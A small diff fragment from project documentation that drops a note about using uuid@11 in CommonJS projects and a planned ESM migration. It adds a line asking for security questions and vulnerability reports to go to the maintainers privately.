-**Note**: For CommonJS projects, uuid@11 is recommended. Future migration to ESM + uuid@14.x planned before 2028.
-
----
+For questions about security features or to report vulnerabilities, please contact the maintainers through secure channels.
